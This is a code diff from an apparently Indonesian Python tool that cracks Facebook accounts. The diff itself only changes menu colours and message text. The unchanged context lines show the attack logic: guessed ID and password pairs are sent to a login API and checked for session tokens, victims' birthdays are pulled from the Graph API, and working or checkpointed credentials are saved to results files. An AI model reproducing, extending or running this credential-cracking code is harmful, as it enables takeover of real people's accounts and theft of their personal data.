@@ -299,11 +299,11 @@ class sunda:
 		print(" %s[%s04%s]. Crack dari Like Postingan"%(N,O,N))
 		print(" %s[%s05%s]. Crack dari Grup"%(N,O,N))
 		print(" %s[%s06%s]. Crack dari Hastag"%(N,O,N))
-		print(" %s[%s07%s]. Cek hasil Crack"%(N,O,N))
-		print(" %s[%s08%s]. Info SC ROY (%s+%s)"%(N,O,N,H,N))
-		print(" %s[%s09%s]. Fitur Dump ID (%s+%s)"%(N,O,N,H,N))
-		print(" %s[%s10%s]. Update SC (%s+%s)"%(N,O,N,H,N))
-		print(" %s[%s00%s]. Logout (%sHapus Cookies%s)"%(N,O,N,M,N))
+		print(" %s[%s07%s]. Cek hasil Crack (%sNew%s)"%(N,K,N,H,N))
+		print(" %s[%s08%s]. Info SC ROY (%sNew%s)"%(N,K,N,H,N))
+		print(" %s[%s09%s]. Fitur Dump ID (%sNew%s)"%(N,K,N,H,N))
+		print(" %s[%s10%s]. Update SC (%sNew%s)"%(N,H,N,H,N))
+		print(" %s[%s00%s]. Logout (%sHapus Cookies%s)"%(N,M,N,M,N))
 		print( 50 * '=')
 		
 # ---- Method Cookies --->
@@ -724,7 +724,7 @@ class ngewe:
 									except: pass
 							hasil(live,chek)
 						else:
-							print ('\n %s[%s!%s] input yang bener goblok!'%(N,M,N))
+							print ('\n %s[%s!%s] input yang benar!'%(N,M,N))
 					print("\n %s[%s?%s] Pilih Metode login - silahkan coba satu² :\n"%(N,K,N,))
 					print(" %s[%s1%s]. Metode API (%sProses Cepat%s)"%(N,O,N,H,N))
 					print(" %s[%s2%s]. Metode mbasic (%sProses Sedang%s)"%(N,O,N,K,N))
@@ -753,7 +753,7 @@ class ngewe:
 			send=ses.get(api,params=param, headers={'user-agent': user_agent})
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
-				print(f"\r{N}[{H}✓{N}]{H} OK                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
+				print(f"\r{H} OK                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
 				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID : {user}\n [✓] PW FB : {pw}\n")
 				live.append(f" [✓] ID : {user}\n [✓] PW FB : {pw}")
 				break
@@ -764,14 +764,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
 					chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n")
 				chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}")
 				break
@@ -817,14 +817,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
 					chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n")
 				chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}")
 				break
